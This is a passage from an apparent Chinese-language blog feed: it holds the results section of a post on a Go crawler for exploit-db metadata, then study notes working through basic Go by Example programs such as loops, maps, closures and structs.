class="hljs-keyword">return</span><br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p>设置最大线程数为20，在3min之内可以成功获取所有信息：</p><p><img src="/2023/04/27/file-upload/age-20231207164211568.png" alt="image-20231207164211568"></p><p>查看数据库信息：</p><p>包含id，描述，type，platform，date_published，verified，cve，osvdb，others等字段：</p><p><img src="/2023/04/27/file-upload/age-20231207164427659.png" alt="image-20231207164427659"></p>]]></content>
    
    
    <categories>
      
      <category>crush</category>
      
    </categories>
    
    
    <tags>
      
      <tag>crush</tag>
      
      <tag>golang</tag>
      
      <tag>exploit-db</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>gobyexample通关笔记</title>
    <link href="/2024/07/23/gobyexample%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/07/23/gobyexample%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>项目地址：<a href="https://gobyexample.com/">Go by Example</a></p><h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    fmt.Println(<span class="hljs-string">&quot;Hello World&quot;</span>)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Values"><a href="#Values" class="headerlink" title="Values"></a>Values</h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br>func main() &#123;  <br>    fmt.<span class="hljs-keyword">Println</span>(<span class="hljs-string">&quot;go&quot;</span> + <span class="hljs-string">&quot;lang&quot;</span>)  <br>    fmt.<span class="hljs-keyword">Println</span>(<span class="hljs-string">&quot;1+1=&quot;</span>, <span class="hljs-number">1</span>+<span class="hljs-number">1</span>)  <br>    fmt.<span class="hljs-keyword">Println</span>(<span class="hljs-string">&quot;7.0/3.0&quot;</span>, <span class="hljs-number">7.0</span>/<span class="hljs-number">3.0</span>)  <br>    fmt.<span class="hljs-keyword">Println</span>(<span class="hljs-keyword">true</span> &amp;&amp; <span class="hljs-keyword">false</span>)  <br>&#125;<br></code></pre></td></tr></table></figure><p>fmt.Println() 函数是一个可变参数函数，可以接受任意数量的参数，并在输出时将它们格式化为字符串。在执行 fmt.Println(“1+1&#x3D;”, 1+1) 时，Go 会将第一个参数 “1+1&#x3D;” 和第二个参数 1+1格式化为字符串，并将它们连在一起输出。由于1+1 是一个表达式，它会在编译时求值并将结果转换为字符串。</p><h2 id="Variables"><a href="#Variables" class="headerlink" title="Variables"></a>Variables</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>    <span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">a</span> = <span class="hljs-string">&quot;golang&quot;</span>  <br>    <span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">b</span>, c = <span class="hljs-number">12</span>, <span class="hljs-number">34</span>  <br>    <span class="hljs-selector-tag">var</span> d = true  <br>    e := <span class="hljs-string">&quot;ry4n&quot;</span>  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-selector-tag">a</span>, <span class="hljs-selector-tag">b</span>, c, d, e)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Constants"><a href="#Constants" class="headerlink" title="Constants"></a>Constants</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;math&quot;</span>)  <br>  <br><span class="hljs-keyword">const</span> s <span class="hljs-type">string</span> = <span class="hljs-string">&quot;conststring&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    fmt.Println(s)  <br>    <span class="hljs-keyword">const</span> n = <span class="hljs-number">500</span>  <br>    fmt.Println(n)  <br>    fmt.Println(<span class="hljs-type">int64</span>(n))  <br>    fmt.Println(math.Sin(n))  <br>&#125;<br></code></pre></td></tr></table></figure><p>数值型的常量在被赋予类型之前没有类型，例如显示转换。</p><h2 id="For"><a href="#For" class="headerlink" title="For"></a>For</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    i := <span class="hljs-number">1</span>  <br>    <span class="hljs-keyword">for</span> i &lt; <span class="hljs-number">5</span> &#123;  <br>       fmt.Println(i)  <br>       i++  <br>    &#125;  <br>    <span class="hljs-keyword">for</span> j := <span class="hljs-number">1</span>; j &lt; <span class="hljs-number">3</span>; j++ &#123;  <br>       fmt.Println(j)  <br>    &#125;  <br>    <span class="hljs-keyword">for</span> k := <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">5</span>; k++ &#123;  <br>       <span class="hljs-keyword">if</span> k%<span class="hljs-number">2</span> == <span class="hljs-number">0</span> &#123;  <br>          <span class="hljs-keyword">continue</span>  <br>       &#125;  <br>       fmt.Println(k)  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="If-Else"><a href="#If-Else" class="headerlink" title="If&#x2F;Else"></a>If&#x2F;Else</h2><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xquery">package main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>)  <br>  <br>func main() &#123;  <br>    <span class="hljs-keyword">if</span> <span class="hljs-number">7</span><span class="hljs-meta">%2</span> == <span class="hljs-number">0</span> &#123;  <br>       fmt.Println(<span class="hljs-string">&quot;even&quot;</span>)  <br>    &#125;  <br>    <span class="hljs-keyword">if</span> <span class="hljs-number">8</span><span class="hljs-meta">%2</span> == <span class="hljs-number">0</span> &#123;  <br>       fmt.Println(<span class="hljs-string">&quot;odd&quot;</span>)  <br>    &#125;  <br>    <span class="hljs-keyword">if</span> <span class="hljs-number">7</span><span class="hljs-meta">%2</span> == <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-number">8</span><span class="hljs-meta">%2</span> == <span class="hljs-number">0</span> &#123;  <br>       fmt.Println<span class="hljs-built_in">(false</span>)  <br>    &#125;  <br>    <span class="hljs-keyword">if</span> <span class="hljs-number">7</span><span class="hljs-meta">%2</span> == <span class="hljs-number">0</span> || <span class="hljs-number">8</span><span class="hljs-meta">%2</span> == <span class="hljs-number">0</span> &#123;  <br>       fmt.Println<span class="hljs-built_in">(true</span>)  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Switch"><a href="#Switch" class="headerlink" title="Switch"></a>Switch</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    <span class="hljs-keyword">var</span> input <span class="hljs-type">string</span>  <br>    fmt.Scanln(&amp;input)  <br>    <span class="hljs-keyword">switch</span> input &#123;  <br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;1&quot;</span>:  <br>       &#123;  <br>          fmt.Println(<span class="hljs-string">&quot;input 1&quot;</span>)  <br>       &#125;  <br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;2&quot;</span>:  <br>       &#123;  <br>          fmt.Println(<span class="hljs-string">&quot;input 2&quot;</span>)  <br>       &#125;  <br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;3&quot;</span>:  <br>       &#123;  <br>          fmt.Println(<span class="hljs-string">&quot;input 3&quot;</span>)  <br>       &#125;  <br>    <span class="hljs-keyword">default</span>:  <br>       fmt.Println(<span class="hljs-string">&quot;input others&quot;</span>)  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Arrays"><a href="#Arrays" class="headerlink" title="Arrays"></a>Arrays</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>    <span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">a</span> <span class="hljs-selector-attr">[5]</span>int  <br>    <span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> := range <span class="hljs-selector-tag">a</span> &#123;  <br>       fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[i]</span>)  <br>    &#125;  <br>    <span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[1]</span> = <span class="hljs-number">3</span>  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[1]</span>)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-built_in">len</span>(a))  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Slice"><a href="#Slice" class="headerlink" title="Slice"></a>Slice</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;reflect&quot;</span>)  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>    <span class="hljs-selector-tag">var</span> s <span class="hljs-selector-attr">[]</span>string  <br>    fmt<span class="hljs-selector-class">.Println</span>(reflect<span class="hljs-selector-class">.TypeOf</span>(s))  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-built_in">len</span>(s), <span class="hljs-built_in">cap</span>(s))  <br>  <br>    s1 := <span class="hljs-built_in">make</span>(<span class="hljs-selector-attr">[]</span>string, <span class="hljs-number">5</span>)  <br>    fmt<span class="hljs-selector-class">.Println</span>(reflect<span class="hljs-selector-class">.TypeOf</span>(s1))  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-built_in">len</span>(s1), <span class="hljs-built_in">cap</span>(s1))  <br>  <br>    s1<span class="hljs-selector-attr">[0]</span> = <span class="hljs-string">&quot;a&quot;</span>  <br>    s1 = <span class="hljs-built_in">append</span>(s1, <span class="hljs-string">&quot;b&quot;</span>)  <br>    fmt<span class="hljs-selector-class">.Println</span>(s1)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-built_in">len</span>(s1), <span class="hljs-built_in">cap</span>(s1))  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    m := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">string</span>)  <br>    m[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;first&quot;</span>  <br>    m[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;second&quot;</span>  <br>    fmt.Println(m)  <br>    <span class="hljs-built_in">delete</span>(m, <span class="hljs-number">1</span>)  <br>    fmt.Println(m)  <br>    m = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">string</span>)  <br>    fmt.Println(m)  <br>&#125;<br></code></pre></td></tr></table></figure><p>可以通过 make 创建一个新的 map，来删除原来 map 中的数据。</p><h2 id="Range"><a href="#Range" class="headerlink" title="Range"></a>Range</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    num := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;  <br>    sum := <span class="hljs-number">0</span>  <br>    <span class="hljs-keyword">for</span> _, i := <span class="hljs-keyword">range</span> num &#123;  <br>       sum += i  <br>    &#125;  <br>    fmt.Println(sum)  <br>    m := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>)  <br>    m[<span class="hljs-string">&quot;a&quot;</span>] = <span class="hljs-string">&quot;apple&quot;</span>  <br>    m[<span class="hljs-string">&quot;b&quot;</span>] = <span class="hljs-string">&quot;golang&quot;</span>  <br>    <span class="hljs-keyword">for</span> k, v := <span class="hljs-keyword">range</span> m &#123;  <br>       fmt.Println(k, v)  <br>    &#125;  <br>    <span class="hljs-keyword">for</span> j := <span class="hljs-keyword">range</span> m &#123;  <br>       fmt.Println(j)  <br>    &#125;  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">plus</span><span class="hljs-params">(a, b <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;  <br>    <span class="hljs-keyword">return</span> a + b  <br>  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    res := plus(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)  <br>    fmt.Println(res)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Multiple-Return-Values"><a href="#Multiple-Return-Values" class="headerlink" title="Multiple Return Values"></a>Multiple Return Values</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span> (<span class="hljs-type">int</span>, <span class="hljs-type">int</span>) &#123;  <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>, <span class="hljs-number">2</span>  <br>&#125;  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    a, b := test()  <br>    fmt.Println(a, b)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Variadic-Functions"><a href="#Variadic-Functions" class="headerlink" title="Variadic Functions"></a>Variadic Functions</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;reflect&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">sum</span><span class="hljs-params">(nums ...<span class="hljs-type">int</span>)</span></span> &#123;  <br>    fmt.Println(nums, <span class="hljs-string">&quot; &quot;</span>)  <br>    fmt.Println(reflect.TypeOf(nums))  <br>    total := <span class="hljs-number">0</span>  <br>    <span class="hljs-keyword">for</span> _, num := <span class="hljs-keyword">range</span> nums &#123;  <br>       total += num  <br>    &#125;  <br>    fmt.Println(total)  <br>  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    sum(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)  <br>    sum(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)  <br>    nums := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;  <br>    sum(nums...)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Closures"><a href="#Closures" class="headerlink" title="Closures"></a>Closures</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> main  <br>  <br>import <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br>func intSe<span class="hljs-string">q()</span> func() <span class="hljs-keyword">int</span> &#123;  <br>    i := <span class="hljs-number">0</span>  <br>    <span class="hljs-keyword">return</span> func() <span class="hljs-keyword">int</span> &#123;  <br>       i++  <br>       <span class="hljs-keyword">return</span> i  <br>    &#125;  <br>&#125;  <br>  <br>func main() &#123;  <br>  <br>    nextInt := intSe<span class="hljs-string">q()</span>  <br>  <br>    fmt.Println(nextInt())  <br>    fmt.Println(nextInt())  <br>    fmt.Println(nextInt())  <br>  <br>    newInts := intSe<span class="hljs-string">q()</span>  <br>    fmt.Println(newInts())  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Recursion"><a href="#Recursion" class="headerlink" title="Recursion"></a>Recursion</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">fact</span><span class="hljs-params">(n <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;  <br>    <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span> &#123;  <br>       <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>  <br>    &#125;  <br>    <span class="hljs-keyword">return</span> n * fact(n<span class="hljs-number">-1</span>)  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    fmt.Println(fact(<span class="hljs-number">5</span>))  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Pointers"><a href="#Pointers" class="headerlink" title="Pointers"></a>Pointers</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">zeroval</span><span class="hljs-params">(ival <span class="hljs-type">int</span>)</span></span> &#123;  <br>    ival = <span class="hljs-number">0</span>  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">zeroptr</span><span class="hljs-params">(iptr *<span class="hljs-type">int</span>)</span></span> &#123;  <br>    *iptr = <span class="hljs-number">0</span>  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    i := <span class="hljs-number">1</span>  <br>    fmt.Println(<span class="hljs-string">&quot;initial:&quot;</span>, i)  <br>  <br>    zeroval(i)  <br>    fmt.Println(<span class="hljs-string">&quot;zeroval:&quot;</span>, i)  <br>  <br>    zeroptr(&amp;i)  <br>    fmt.Println(<span class="hljs-string">&quot;zeroptr:&quot;</span>, i)  <br>  <br>    fmt.Println(<span class="hljs-string">&quot;pointer:&quot;</span>, &amp;i)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Structs"><a href="#Structs" class="headerlink" title="Structs"></a>Structs</h2><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs xquery">package main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br>type company struct &#123;  <br>   <span class="hljs-built_in"> name</span><span class="hljs-built_in"> string</span>  <br>   <span class="hljs-built_in"> id</span>   int  <br>&#125;  <br>  <br>func newCompany<span class="hljs-built_in">(name</span><span class="hljs-built_in"> string</span>) *company &#123;  <br>    <span class="hljs-type">item</span> := company<span class="hljs-built_in">&#123;name</span>:<span class="hljs-built_in"> name</span>&#125;  <br>    <span class="hljs-keyword">return</span> &amp;<span class="hljs-type">item</span>  <br>&#125;  <br>  <br>func main() &#123;  <br>  <br>    fmt.Println(company&#123;<span class="hljs-string">&quot;AAA&quot;</span>, <span class="hljs-number">20</span>&#125;)  <br>    fmt.Println(newCompany(<span class="hljs-string">&quot;BBB&quot;</span>))  <br>  <br>    fmt.Println(&amp;company<span class="hljs-built_in">&#123;name</span>: <span class="hljs-string">&quot;Ann&quot;</span>,<span class="hljs-built_in"> id</span>: <span class="hljs-number">40</span>&#125;)  <br>    fmt.Println(company<span class="hljs-built_in">&#123;name</span>: <span class="hljs-string">&quot;Ann&quot;</span>,<span class="hljs-built_in"> id</span>: <span class="hljs-number">40</span>&#125;)  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Methods"><a href="#Methods" class="headerlink" title="Methods"></a>Methods</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 